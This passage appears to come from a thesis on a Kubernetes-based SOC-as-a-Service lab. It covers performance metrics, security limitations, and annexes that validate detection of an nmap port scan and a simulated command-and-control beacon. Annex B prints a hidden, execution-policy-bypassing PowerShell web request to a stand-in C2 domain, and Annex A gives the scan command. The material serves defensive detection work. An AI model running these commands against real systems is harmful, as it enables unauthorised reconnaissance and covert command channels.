| AI recommendation quality | Analyst checklist or manual review of recommendation relevance | [insert measured value] | Evaluates whether recommendations support investigation without inventing evidence. |
| Sandbox report generation time | Time from sandbox request to TheHive report update | [insert measured value] | Measures practical feasibility of automated sample analysis. |
| Sandbox cleanup reliability | VM and disk cleanup status after each sandbox run | [insert measured value] | Confirms that disposable analysis environments are not reused. |
| Total VMs | Infrastructure inventory | 5 VMs | Confirms the complete lab topology: 3 Kubernetes nodes and 2 victims. |
| Total Kubernetes pods | `kubectl get pods -A` count | 26 pods | Indicates deployed SOCaaS workload scale. |
| Total Kubernetes services | `kubectl get svc -A` count | 16 services | Indicates service exposure and internal communication complexity. |
| Wazuh agents | Wazuh agent inventory | 2 agents | Confirms Linux and Windows endpoint coverage. |
| Shuffle workflow actions | Workflow action count | 9 implemented core actions | Confirms the scope of automated triage. |
| Persistent storage | Sum of SOCaaS PVCs | Around 85 GB | Confirms storage provisioning for SIEM, SOAR, and case-management components. |
| Deduplication TTL | Pipeline Gateway configuration | 300 seconds | Defines the suppression window for duplicate alerts. |

The deduplication result is one of the most important operational findings. Without deduplication, a 200-port scan can generate approximately 200 firewall block events, causing repeated Wazuh alerts, multiple Shuffle executions, and multiple TheHive cases. With the 300-second TTL cache, the same activity is grouped into approximately one forwarded alert and one SOC case. This significantly improves analyst usability and prevents automation overload in the lab.

> **Figure 4.28 - Wazuh Detection Timestamp**  
> [Insert figure here: Wazuh alert timestamp.]

> **Figure 4.29 - Shuffle Workflow Execution Time**  
> [Insert figure here: Shuffle workflow start/end time.]

> **Figure 4.30 - TheHive Case Timeline**  
> [Insert figure here: TheHive timeline showing alert/case creation.]

## 4.11 Security Considerations and Limitations

Several security considerations and limitations were identified during implementation and validation. First, AI recommendations can improve case readability and analyst guidance, but they may be incomplete or too generic. They must therefore remain advisory and must not replace deterministic detection logic, analyst validation, or formal incident response procedures.

Second, VirusTotal enrichment has limitations in a private lab network. Private IP addresses such as `192.168.122.98` and `192.168.122.180` cannot be meaningfully scored by VirusTotal. SOCaaS mitigates this by skipping private IP ranges and selecting file hashes, domains, URLs, or public IPs when available. Analysts must not interpret a skipped private-IP lookup as evidence of maliciousness.

Third, Telegram notification formatting and connectivity can be unreliable depending on the Shuffle application behavior and network egress conditions. For this reason, Telegram is used only for concise operational notification, while detailed context is stored in TheHive and email. Fourth, TheHive requires the correct `X-Organisation: socaas` header for operational API calls. Incorrect organization context can lead to authorization failures even when credentials appear valid.

The AI Sandbox introduces additional risks. Malware may attempt sandbox escape, detect virtualization, or abuse network access. The sandbox must therefore use isolated networks, disposable linked clones, no host shared folders, strict cleanup, and limited connectivity. Sample acquisition also introduces risk because retrieving suspicious files from endpoints can expose sensitive files or spread malware if implemented incorrectly. A production sample collector must enforce authentication, TLS, maximum file size, allowed paths, hash verification, quarantine controls, and audit logging.

The laboratory deployment does not implement TLS everywhere. Internal HTTP services are acceptable for a controlled lab, but production deployment requires HTTPS and preferably mutual TLS for internal APIs. The Pipeline Gateway deduplication cache is currently in memory, which means deduplication state is lost if the gateway restarts. A production version should store deduplication state in Redis or another persistent cache. Finally, sandbox VM creation can cause resource exhaustion if many malware alerts arrive at once. A production sandbox orchestrator must include queueing, concurrency limits, timeouts, and cleanup workers.

All secrets, API keys, tokens, and passwords used in the laboratory must be rotated before production use. No real private credentials should be included in thesis figures, source code excerpts, or annex evidence.

## 4.12 Conclusion

This chapter demonstrated the implementation and validation testing of the SOCaaS platform. SOCaaS was successfully deployed on Kubernetes using a multi-node virtualized laboratory. Wazuh, Shuffle, TheHive, the Pipeline Gateway, VirusTotal, Telegram/email notification, and AI recommendation logic were integrated into an end-to-end detection and response pipeline.

The malware validation scenario confirmed that SOCaaS can detect suspicious file activity on the Windows victim endpoint, enrich the event through VirusTotal, notify analysts, create a TheHive case, generate AI-assisted response recommendations, and prepare the case for sandbox analysis. The EXIF sandbox validation case demonstrated the feasibility of AI-assisted sample metadata analysis and structured report generation for TheHive integration.

The Nmap and Command and Control scenarios are documented as annexes because they provide additional evidence for network scanning and C2-oriented detection, but they are secondary to the main malware and sandbox validation cases. Overall, the implemented architecture demonstrates the feasibility of a fully open-source SOCaaS platform for SMEs and institutions, while also identifying the operational controls required before production deployment.

# Annexes

## Annex A - Nmap Port Scan Detection Case

### A.1 Scenario Objective

The objective of this annex is to validate SOCaaS detection and automation for network service scanning. The scenario uses the Linux victim endpoint `victim-01` with IP address `192.168.122.180`. The attacker performs a TCP SYN scan against ports `1-200`. The expected result is that UFW blocks the connection attempts, kernel logs are generated, the Wazuh agent forwards the logs to the Wazuh Manager, Rule `4100` detects the scan behavior, the Pipeline Gateway deduplicates the burst of alerts, and Shuffle creates a notification and TheHive case.

The scenario maps to MITRE ATT&CK `T1046 - Network Service Scanning` under the Discovery tactic.

### A.2 Attack Execution

The validation command used for the Linux scan case was:

```bash
sudo nmap -sS -Pn -p 1-200 192.168.122.180
```

The `-sS` option performs a TCP SYN scan, `-Pn` disables host discovery and treats the target as up, and `-p 1-200` restricts the scan to the first 200 TCP ports. This configuration intentionally produces multiple connection attempts and therefore multiple firewall events on the victim endpoint.

### A.3 Detection Logic

UFW on `victim-01` blocks the scan attempts and writes kernel log entries. The Wazuh Linux agent collects these logs and forwards them to the Wazuh Manager. The custom kernel UFW `BLOCK` decoder extracts relevant fields such as source IP, destination IP, destination port, and protocol. Wazuh Rule `4100` detects the firewall block and scan-related activity at an actionable severity level.

The alert is then written to `alerts.json`, where the Wazuh Alert Forwarder reads it and forwards it to the Pipeline Gateway. This confirms the SIEM-to-pipeline integration for Linux firewall events.

### A.4 Deduplication Behavior

The Nmap scan produces approximately 200 raw firewall block events. Without deduplication, these events would create an excessive number of Shuffle workflow executions and TheHive cases. The Pipeline Gateway deduplication cache suppresses repeated alerts for 300 seconds using a key based on agent name, agent IP, source IP, and rule ID.

In this case, approximately 200 raw alerts are reduced to approximately one forwarded alert. This behavior is essential for SOC usability because port scans are bursty by nature and should generally be represented as one investigation case rather than hundreds of duplicate cases.

### A.5 SOAR Processing

After deduplication, the unique scan alert is forwarded to the SOCaaS Wazuh Alert Triage Workflow. The workflow normalizes the alert, classifies it as `scan`, selects an appropriate VirusTotal target only if a public scanner IP is available, generates scan-specific AI recommendations, sends a concise Telegram notification, sends a detailed email notification, and creates the TheHive case.

The AI recommendations for this scenario should focus on validating whether the scan source is authorized, checking exposed services, reviewing firewall and Wazuh evidence, correlating with other logs, and blocking or escalating the source if unauthorized.

### A.6 TheHive Case Creation

The expected TheHive case title for this scenario is:

```text
[SOCaaS][CRITICAL][scan]
```

The case should include the Linux victim endpoint, source scanner information if available, Wazuh Rule `4100`, the MITRE ATT&CK technique `T1046`, and a summary of the deduplication behavior. The case provides the analyst with a single investigation record for the scan burst.

### A.7 Analyst Response

The recommended analyst response is to validate whether the scanning host is authorized, review the targeted ports, identify exposed services on the Linux victim endpoint, confirm whether the scan originated from an internal lab host or external source, and block the source if it is unauthorized. If the scan is part of an approved assessment, the case should be documented and closed as authorized activity. If it is not authorized, the analyst should preserve firewall evidence, escalate the incident, and monitor for follow-on activity.

### A.8 Evidence and Figures

> **Figure A.1 - Nmap Scan Command Execution**  
> [Insert figure here.]

> **Figure A.2 - UFW Block Logs on victim-01**  
> [Insert figure here.]

> **Figure A.3 - Wazuh Port Scan Alert**  
> [Insert figure here.]

> **Figure A.4 - Shuffle Workflow Triggered by Nmap Detection**  
> [Insert figure here.]

> **Figure A.5 - TheHive Nmap Scan Case**  
> [Insert figure here.]

## Annex B - Command and Control Detection Case

### B.1 Scenario Objective

The objective of this annex is to validate SOCaaS behavior for a simulated Command and Control event on the Windows victim endpoint `win10-vicitm` with IP address `192.168.122.98`. The scenario represents a suspicious outbound connection from `powershell.exe` to an external destination over HTTPS. The destination IP is `104.21.0.170`, the destination port is `443`, and the domain is `c2-demo.socaas-lab.example`.

The scenario maps to MITRE ATT&CK `T1071.001 - Application Layer Protocol: Web Protocols`, `T1095 - Non-Application Layer Protocol`, and `T1573 - Encrypted Channel`. `T1571 - Non-Standard Port` is relevant only if the same behavior is reproduced over a non-standard service port.

### B.2 Simulated C2 Behavior

The simulated command line is:

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri https://c2-demo.socaas-lab.example/api/checkin -Method POST
```

The process is `powershell.exe`, and the parent process is `explorer.exe`. This process relationship represents user-context PowerShell execution with hidden-window behavior and a web request to an external endpoint. In a real intrusion, this pattern may indicate beaconing, staged payload retrieval, or command check-in activity.

### B.3 Detection Logic

The expected telemetry source is a Wazuh/Sysmon network connection event, specifically Sysmon Event ID `3`. The event should contain the process image, source IP, source port, destination IP, destination port, protocol, and destination hostname. Wazuh ingests the event through the Windows agent and generates an alert containing the relevant C2 context.

The key detection elements are the suspicious process, the external destination, the HTTPS destination port, the domain, and the command-line arguments. The event is then forwarded through the same Pipeline Gateway and Shuffle workflow used by other SOCaaS detections.

### B.4 Enrichment and AI Recommendation

For this scenario, `Build_VirusTotal_Target` should prioritize the domain `c2-demo.socaas-lab.example` or the public destination IP `104.21.0.170`. The private source IP `192.168.122.98` must be ignored for VirusTotal scoring because it belongs to the lab network.

The AI recommendations should focus on confirming beaconing behavior, reviewing the PowerShell process tree, examining DNS and proxy logs, checking whether other endpoints contacted the same domain or IP address, isolating the Windows victim endpoint if malicious behavior is confirmed, and collecting volatile evidence before remediation.

### B.5 TheHive Case Creation

TheHive should receive a case containing the Windows victim endpoint, process name, parent process, command line, destination IP, destination port, domain, Wazuh/Sysmon event context, enrichment summary, and AI recommendations. The case should classify the alert as `c2` and preserve MITRE ATT&CK mapping for analyst reporting.

### B.6 Analyst Response

The recommended response is to validate the destination reputation, confirm whether the domain is expected in the environment, inspect PowerShell execution history, review the parent process and user context, search for similar network events across other endpoints, isolate the host if beaconing is confirmed, and preserve process, network, DNS, and proxy evidence. The analyst should also check for persistence mechanisms, downloaded payloads, and associated credential or exfiltration activity.

### B.7 Evidence and Figures

> **Figure B.1 - C2 Simulation Payload or Webhook Event**  
> [Insert figure here.]

> **Figure B.2 - Wazuh/Sysmon C2 Alert**  
> [Insert figure here.]

> **Figure B.3 - Shuffle C2 Workflow Execution**  
> [Insert figure here.]

> **Figure B.4 - AI Recommendations for C2 Investigation**  
> [Insert figure here.]

> **Figure B.5 - TheHive C2 Case**  
> [Insert figure here.]
